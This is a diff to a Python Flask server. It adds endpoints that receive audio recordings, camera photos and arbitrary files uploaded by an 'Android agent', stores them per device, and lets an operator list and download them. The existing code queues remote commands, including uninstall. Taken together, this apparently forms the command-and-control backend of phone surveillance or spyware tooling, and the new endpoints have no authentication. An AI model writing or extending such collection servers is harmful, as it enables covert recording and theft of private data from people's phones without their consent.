@@ -72,6 +72,9 @@ def _dev(did):
             "history": collections.deque(maxlen=100),
             "persistent": False,
             "full": False,
+            "audios": collections.deque(maxlen=10),
+            "photos": collections.deque(maxlen=10),
+            "files": {},
         }
     return _devices[did]
 
@@ -1209,6 +1212,127 @@ def api_device_delete(did):
         d["pending"]["cmd"]  = "__uninstall__"
         d["pending"]["id"]  += 1
     return jsonify({"ok": True, "queued": "uninstall"})
+
+# ── Android agent media upload endpoints ─────────────────────────────────────
+
+@app.route("/esp/device-audio", methods=["POST"])
+def esp_device_audio():
+    data = request.get_json(silent=True) or {}
+    did  = (data.get("did") or "").strip()
+    b64  = data.get("audio", "")
+    if did and b64:
+        with lock:
+            _dev(did)["audios"].appendleft({
+                "ts": time.time(), "b64": b64,
+                "fmt": data.get("fmt", "m4a"),
+                "secs": data.get("secs", 0),
+            })
+    return jsonify({"ok": bool(did and b64)})
+
+@app.route("/esp/device-photo", methods=["POST"])
+def esp_device_photo():
+    data = request.get_json(silent=True) or {}
+    did  = (data.get("did") or "").strip()
+    b64  = data.get("img", "")
+    if did and b64:
+        with lock:
+            _dev(did)["photos"].appendleft({
+                "ts": time.time(), "b64": b64,
+                "cam": data.get("cam", "back"),
+            })
+    return jsonify({"ok": bool(did and b64)})
+
+@app.route("/esp/device-file", methods=["POST"])
+def esp_device_file():
+    data = request.get_json(silent=True) or {}
+    did  = (data.get("did") or "").strip()
+    b64  = data.get("data", "")
+    name = data.get("name", "file")
+    if did and b64:
+        with lock:
+            _dev(did)["files"][name] = {
+                "ts": time.time(), "b64": b64,
+                "size": data.get("size", 0),
+            }
+    return jsonify({"ok": bool(did and b64)})
+
+@app.route("/api/devices/<did>/audio")
+def api_device_audio(did):
+    with lock:
+        if did not in _devices or not _devices[did]["audios"]:
+            return jsonify({"error": "no audio"}), 404
+        item = list(_devices[did]["audios"])[0]
+    try:
+        audio_bytes = base64.b64decode(item["b64"])
+    except Exception:
+        return jsonify({"error": "bad audio data"}), 500
+    fmt  = item.get("fmt", "m4a")
+    mime = "audio/mp4" if fmt in ("m4a", "mp4") else "audio/3gpp"
+    resp = Response(audio_bytes, mimetype=mime)
+    resp.headers["Cache-Control"] = "no-store"
+    resp.headers["Content-Disposition"] = f'attachment; filename="recording.{fmt}"'
+    return resp
+
+@app.route("/api/devices/<did>/audio/list")
+def api_device_audio_list(did):
+    with lock:
+        if did not in _devices:
+            return jsonify([])
+        items = [{"ts": a["ts"], "secs": a["secs"], "fmt": a["fmt"]}
+                 for a in list(_devices[did]["audios"])]
+    return jsonify(items)
+
+@app.route("/api/devices/<did>/photo")
+def api_device_photo(did):
+    idx = int(request.args.get("idx", 0))
+    with lock:
+        if did not in _devices or not _devices[did]["photos"]:
+            return jsonify({"error": "no photo"}), 404
+        items = list(_devices[did]["photos"])
+        if idx >= len(items):
+            return jsonify({"error": "index out of range"}), 404
+        item = items[idx]
+    try:
+        img_bytes = base64.b64decode(item["b64"])
+    except Exception:
+        return jsonify({"error": "bad image data"}), 500
+    resp = Response(img_bytes, mimetype="image/jpeg")
+    resp.headers["Cache-Control"] = "no-store"
+    return resp
+
+@app.route("/api/devices/<did>/photo/list")
+def api_device_photo_list(did):
+    with lock:
+        if did not in _devices:
+            return jsonify([])
+        items = [{"ts": p["ts"], "cam": p["cam"], "idx": i}
+                 for i, p in enumerate(list(_devices[did]["photos"]))]
+    return jsonify(items)
+
+@app.route("/api/devices/<did>/files")
+def api_device_files(did):
+    with lock:
+        if did not in _devices:
+            return jsonify([])
+        files = [{"name": k, "ts": v["ts"], "size": v["size"]}
+                 for k, v in _devices[did]["files"].items()]
+    files.sort(key=lambda x: -x["ts"])
+    return jsonify(files)
+
+@app.route("/api/devices/<did>/files/<fname>")
+def api_device_file_dl(did, fname):
+    with lock:
+        if did not in _devices or fname not in _devices[did]["files"]:
+            return jsonify({"error": "not found"}), 404
+        item = _devices[did]["files"][fname]
+    try:
+        data = base64.b64decode(item["b64"])
+    except Exception:
+        return jsonify({"error": "bad data"}), 500
+    resp = Response(data, mimetype="application/octet-stream")
+    resp.headers["Content-Disposition"] = f'attachment; filename="{fname}"'
+    resp.headers["Cache-Control"] = "no-store"
+    return resp
 
 # ─────────────────────────────────────────────────────────────────────────────
 if __name__ == "__main__":
